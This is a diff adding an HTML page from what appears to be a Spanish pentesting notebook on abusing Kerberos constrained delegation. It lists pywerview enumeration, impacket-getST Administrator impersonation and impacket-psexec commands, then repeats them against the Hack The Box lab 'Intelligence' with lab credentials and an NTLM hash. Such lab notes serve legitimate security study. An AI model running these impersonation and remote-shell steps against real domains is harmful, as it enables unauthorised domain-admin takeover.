@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Kerberos Constrained Delegation | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="kerberos-constrained-delegation">
+          <div class="note-tabbar">
+            <span>Kerberos Constrained Delegation</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Escalada/ACL</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / escalada / acl</p>
+            <h2>Kerberos Constrained Delegation</h2>
+
+            <p>La delegación Kerberos restringida permite solicitar tickets hacia servicios concretos si el objeto está configurado para delegar.</p>
+
+            <p><span class="notebook-review-note">Aviso: <code>AllowedToDelegate</code></span></p>
+            <p>Permite que una cuenta o equipo impersone a otros usuarios frente a un servicio concreto mediante Kerberos Delegation</p>
+            <p><span class="notebook-review-note">Ejemplo: el usuario <code>web_service</code> puede delegar el servicio HTTP al controlador de dominio <code>DC1</code>, por lo que puede solicitar un ticket Kerberos para otro usuario del AD y usarlo contra ese servicio.</span></p>
+            <section class="code-card">
+              <h3>Enumerar SPN asociadas a servicios delegables</h3>
+              <pre><code>pywerview get-netcomputer -u &#x27;&lt;user_domain&gt;&#x27; -p &#x27;&lt;pass_domain&gt;&#x27; -t &#x27;&lt;dc_ip&gt;&#x27; --full-data
+# Buscar etiqueta-&gt; msds-allowedtodelegate: SPN</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Impersonar al usuario Administrator</h3>
+              <pre><code>impacket-getST -spn &#x27;&lt;SPN&gt;&#x27; -impersonate &#x27;Administrator&#x27; -p &#x27;&lt;pass&gt;&#x27; &#x27;&lt;domain&gt;/&lt;user_with_kerberos_delegation&gt;&#x27;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Exportar Credenciales de Kerberos</h3>
+              <pre><code>export KRB5CCNAME=file.ccache</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Acceso PSEXEC con Kerberos</h3>
+              <pre><code>impacket-psexec &#x27;&lt;hostname&gt;&#x27;.&#x27;&lt;domain&gt;&#x27; -k -no-pass</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Enumerar SPN asociadas a servicios delegables con credenciales del dominio</h3>
+              <pre><code>pywerview get-netcomputer -u &#x27;Ted.Graves&#x27; -p &#x27;Mr.Teddy&#x27; -t 10.129.95.154 --full-data
+# Usuario: svc_int
+# AllowedToDelegateTo SPN: WWW/dc.intelligence.htb</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Impersonar al usuario Administrator</h3>
+              <pre><code>impacket-getST -spn &#x27;WWW/dc.intelligence.htb&#x27; -impersonate &#x27;Administrator&#x27; -hashes :d5538dca5ba2ff329c9df39ef130f439 &#x27;intelligence.htb/svc_int$&#x27;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Exportar credenciales Administrator</h3>
+              <pre><code>export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Acceso PSEXEC con Kerberos</h3>
+              <pre><code>impacket-psexec dc.intelligence.htb -k -no-pass</code></pre>
+            </section>
+
+            <h2>Relacionados</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=intelligence">Intelligence</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>escalada</span>
+              <span>acl</span>
+              <span>kerberos</span>
+              <span>delegation</span>
+              <span>constrained_delegation</span>
+              <span>allowedtodelegate</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
